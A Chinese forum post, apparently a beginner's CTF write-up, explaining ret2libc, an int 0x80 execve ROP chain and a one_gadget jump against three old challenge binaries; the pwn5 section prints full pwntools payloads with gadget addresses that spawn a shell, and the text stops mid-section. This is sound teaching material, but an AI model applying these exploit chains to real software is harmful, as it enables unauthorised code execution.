
# [原创]新人PWN入坑总结(二)

接上文，但是我发现给的链接这位I春秋作者好像删除了，不知道因为什么。这里我说明一下，这个新人总结帖发的内容基本都是看那个给的链接教程之后，自己写的，有些`exp`，`payload`什么的可能复制了一点点，但基本都自己改过的。如果那位I春秋的作者看到了要求我删除一些他的东西，请直接私信。

## ROP技术0x03

### 四、Security Fest CTF 2016-tvstation

1.题目给了`libc`库，需要查看一下版本，直接拖到`Linux`中运行一下`./libc.so.6_x64`，就可以知道是`libc2.24`的，但`Linux`中的`libc`没有该版本，所以用`pwndocker`来连接运行。具体怎么用看下方链接，同样`docker`也自行学习。

[afeK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9%4W2K6K9h3c8W2M7W2)9J5c8Y4m8%4L8X3c8G2j5$3E0W2M7R3`.`.](https://bbs.kanxue.com/elink@a83K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9%4W2K6K9h3c8W2M7W2)9J5c8Y4m8%4L8X3c8G2j5$3E0W2M7R3`.`.)

如果需要使用到这个`libc`调试，则在`python`中设置下列代码：

```
#注释头



io = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={"LD_PRELOAD":"./libc.so.6_x64"})
```

2.然后开始分析文件，常规`checksec`，开了`NX`，`IDA`打开文件找漏洞，发现输入4进入`debug`函数后可以泄露`system`的内存地址：

```
#注释头



v0 = dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "system");

sprintf(fmsg, info, v0);

v1 = strlen(fmsg);

write(1, fmsg, v1);
```

`dlsym()`的函数原型是

```
#注释头



void* dlsym(void* handle,const char* symbol);
```

该函数在`<dlfcn.h>`文件中，`handle`是由`dlopen`打开动态链接库后返回的指针，`symbol`就是要求获取的函数的名称，函数返回值是`void*`，指向函数的地址，供调用使用。`write`函数的`fd`是1，所以就相当于直接打印在屏幕上，这里涉及`linux`系统调用号内容，可以直接查`linux`下的目录`/usr/include/asm/`中的`unistd_32.h`和`unistd_64.h`。

这段代码的意思就是把指向`system`函数的指针返回给`v0`，然后将`v0`格式化输出给`fmsg`，之后将`fmsg`原封不动打印在屏幕上，第一次看到猜不出来可以直接运行该文件试试呗。之后会进入一个`debug_func()`，这里存在栈溢出：

```
#注释头



__int64 buf; // [rsp+0h] [rbp-20h]

return read(0, &buf, 0xC8uLL);
```

3.现在有了`system`的内存地址和栈溢出，就差`/bin/sh`字符串了。这里用`IDA`打开题目给的`libc`文件，可以找到`bin/sh`字符串的地址`binsh_libc_addr`和`system`的地址`system_libc_addr`。所以这就相当于有`system`的被`libc`加载的真实地址，那么`system`的真实`system_addr`减去`system_libc_addr`就可以得到`Libc`被加载进来的首地址`libc_start_addr`。即现掌握地址：`libc_start_addr`，`system_addr`，`system_libc_addr`，`binsh_libc_addr`通过计算可得：`binsh_addr = system_addr - system_libc_addr + binsh_libc_addr`。这不是栈溢出有了，`system`函数和`binsh`字符串的真实地址有了，这不直接`getshell`就完事了吗，闹啥呢，这破题目，没点技术含量。

4.但程序还是得走走，64位程序，所以需要使用`ROPgadget`表来查找`pop rdi ; ret`这个代码所在的地址，也是在`Libc`中查找到，然后加上`libc_start_addr`就可得到`pop_rdi_addr`。

5.之后计算偏移量，远程调试下进行，`payload`依次为`padding + pop_rdi_addr + binsh_addr + system_addr`。

6.再考虑输入情况：先在`Linux`下运行，所以能看到需要在接收到`": "`时可以输入4，然后进入到打印`system_addr`，打印完之后，需要从打印出来的`system`地址读取进我们设定的`system_addr`。

7.由于打印格式是`@x0x7ffffff`，所以在`recvuntil("@x")`，之后开始获取打印的`system_addr`：`system_addr = int(io.recv(12), 16)`，以十六进制总共读取12位

8.读取完成`system_addr`后就可以开始输入`payload`，之后就可以`interactive()`。

参考资料：

[d81K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4E0M7q4)9K6b7X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6S2L8i4m8Q4x3@1u0U0N6r3W2V1i4K6y4p5x3e0f1%4](https://bbs.kanxue.com/elink@785K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6U0N6r3W2V1i4K6y4p5x3e0f1%4)

### 五、Tamu CTF 2018-pwn5

1.常规`checksec`，开了`NX`，打开`IDA`后分析找漏洞，可以看到`main`函数中`begning`函数中的，大多都是打印一些东西，然后由于输入到的是全局变量里，所以这些输入都没办法用来栈溢出。

2.接着往下深入，这里可以看到`begning`函数中有：

```
#注释头



char v1; // [esp+Fh] [ebp-9h]

v1 = getchar()
```

但是`getchar()`不能作为溢出，因为不管缓冲区多大，都只会从缓冲区读取一个字符。再深入进到`first_day_corps()`函数，然后可以看到函数`change_major()`，进入之后发现这里存在栈溢出：

```
#注释头



char dest; // [esp+Ch] [ebp-1Ch]

gets(&dest);
```

3.由于`NX`保护，考虑用`ROP`，然后找找`system`和`"/bin/sh"`，这里没有`system`，但是有`int80`，可以通过：

`ROPGadget --binary pwn5 | grep "int 0x80"`

这段代码来查找，`int80`同样可以用来开`shell`。但是`int80`开`shell`需要设置寄存器的值，所以需要用到`gadget`来查找对应的代码段：

`ROPgadget --binary pwn5 | grep "pop eax ; pop ebx ; pop esi ; pop edi ; ret"`

（另外，如果是64位程序则又会不一样了，需要具体查找一下资料。关于`int80`相关的系统调用，有个网址查询：[b09K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6P5i4y4U0j5h3I4D9M7#2)9J5k6h3E0W2M7X3&6W2L8r3N6J5L8$3E0Q4x3X3g2U0L8$3#2Q4x3V1j5`.](https://bbs.kanxue.com/elink@0f0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6P5i4y4U0j5h3I4D9M7#2)9J5k6h3E0W2M7X3&6W2L8r3N6J5L8$3E0Q4x3X3g2U0L8$3#2Q4x3V1j5`.) 这玩意需要挂`VPN`)

查到32位程序`syscall`调用`int80`所需要的条件：设置`eax = 11 = 0xb`, `ebx = &("/bin/sh")`, `ecx = edx = edi = 0`. `"/bin/sh"`

▲这里怎么找都可以，只要最后条件满足即可。参考`pwn_myself - else.py`。代码执行过程中`return`直接就是返回跳转到当前`esp`的指向的内容。所以设置`payload`顺序也很重要。

原作者的代码是：

```
#注释头



ppppr = 0x080a150a	#pop eax; pop ebx; pop esi; pop edi; ret

pppr = 0x080733b0	#pop edx; pop ecx; pop ebx; ret

int_80 = 0x08071005	#int 0x80

binsh = 0x080f1a20	#first_name address



payload = "A"*32      #padding

payload += p32(ppppr) #pop eax; pop ebx; pop esi; pop edi; ret

payload += p32(0xb)   #eax = 0xb

payload += p32(binsh) #ebx = &("/bin/sh")

payload += p32(0)     #esi = 0

payload += p32(0)

payload += p32(0)     #edi = 0

payload += p32(pppr)  #pop edx; pop ecx; pop ebx; ret

payload += p32(0)     #edx = 0

payload += p32(0)     #ecx = 0

payload += p32(binsh) #ebx = &("/bin/sh")

payload += p32(int_80) #int 0x80
```

这里怎么`ROP`都可以，例如下列代码一样的效果：

```
#注释头



p_eax = 0x080BC396

p_esi = 0x080551B2

p_edi = 0x08052FFA

p_edx = 0x0807338A

p_ecx = 0x080E4325

p_ebx = 0x080538EB

int_80 = 0x08071005

binsh = 0x080f1a20 #first_name address



payload = 'A'*32 #padding



##set the value of register

payload += p32(p_eax)

payload += p32(0xb) #eax = 0xb

payload += p32(p_esi)

payload += p32(0) #esi = 0

payload += p32(p_edi)

payload += p32(0) #edi = 0

payload += p32(p_edx)

payload += p32(0) #edx = 0

payload += p32(p_ecx)

payload += p32(0) #ecx = 0

payload += p32(p_ebx)

payload += p32(binsh) #ebx = &("/bin/sh")

payload += p32(int_80) #int 0x80
```

4.考虑到程序中没有`/bin/sh`，而我们又会输入到全局变量中一些东西，所以可以将全局变量当作`/bin/sh`的地址，在输入过程中将`/bin/sh`输入到该全局变量中，可以通过`IDA`查出具体地址，因为全局变量的地址是不会改变的，方便之后调用。

▲挑选`gadget`时，注意不要选择有`0a`字样的，因为当我们往程序中输入时，回车即`"\n"`所对应的就是`0a`，如果有`0a`，则我们的输入不会完全输入进去，只会停在`0a`处，后面的就没办法再输入进去了。

▲由于`int80`的性质，远程调试时会直接错误，需要在`IDA`中反复进行错误丢弃才能进行`shell`操作，但是`process`本地运行却会自动忽略。

参考资料：

[200K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4E0M7q4)9K6b7X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6S2L8i4m8Q4x3@1u0U0N6r3W2V1i4K6y4p5x3e0f1%4](https://bbs.kanxue.com/elink@0f5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6U0N6r3W2V1i4K6y4p5x3e0f1%4)

### 六、TJCTF 2016-oneshot

1.常规`checksec`，只开了`NX`，然后`IDA`打开找漏洞。发现找不到什么漏洞，但是有个很奇怪的地方

```
#注释头



__int64 (__fastcall *v4)(const char *); // [rsp+8h] [rbp-8h]

---------------------------------------------------------------------------

__isoc99_scanf("%ld", &v4);

-------------------------------------------------------------------------

return v4("Good luck!");
```

查看反汇编代码后发现会有这么一串代码，`v4`是我们输入的东西，却被以函数形式调用。在汇编窗口中看下，发现`call puts`函数之后的代码形式是这样的。

```
#注释头



var_8 = qword ptr -8

--------------------------------------------------------

mov  rax, [rbp+var_8]

mov  rdx, rax

mov  eax, 0

call rdx
```

也就是把我们输入的保存在`var_8`里的内容，给了`rax`,`rax`又给了`rdx`，之后`call rdx`。也就是我们输入的东西最后会被当初代码指令来执行。

2.程序不存在栈溢出，输入只能是4个字节，已经规定好了。`%ld`代表`long int`，四个字节，程序又没有一次`getshell`的后门函数，所以就只能靠这4个字节来`getshell`。

3.这里考虑使用`one gadget RCE`来一步`getshell`，首先在`Linux`下查找一下题目给的`libc`中有没有`onegadget`:

![](https://bbs.kanxue.com/upload/attach/202108/904686_9Q8GNFFHNK5G8N7.jpg)

4.这样就可以通过一次跳转来`getshell`，但是第一条有限制条件，由于汇编代码中在`call rdx`之前有`mov eax,0`;即`rax`就等于0。(`eax`在64位程序下就是`rax`的低32位)或者先调试看看能不能满足条件，经过调试发现执行到`call rdx`时`rax = 0`，也满足要求，那么就尝试写`payload`。

5.本地中首先需要连接到指定的库文件中，可以先在`linux`中`ldd libc`库文件来看题目给的库文件是什么版本，之后修改这段代码让`process`能够连接到指定版本的`libc`文件。(`利用pwndocker`，或者自己下个对应版本的`ubuntu`—`docker`，然后安装`python`之类的)

`io = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={"LD_PRELOAD":"./libc.so.6_x64"})`

6.由于不知道`onegadget`被`libc`加载进入之后是在什么地址，所以现在还需要泄露一个地址，刚好程序中有两个`isoc99_scanf`，第一个可以用来输入某个函数.`got`表中`onegadget`的地址，然后程序会打印出来该函数真实地址，对应代码为：

```
#注释头



__isoc99_scanf("%ld", &v4);

printf("Value: 0x%016lx\n", *(_QWORD *)v4);
```
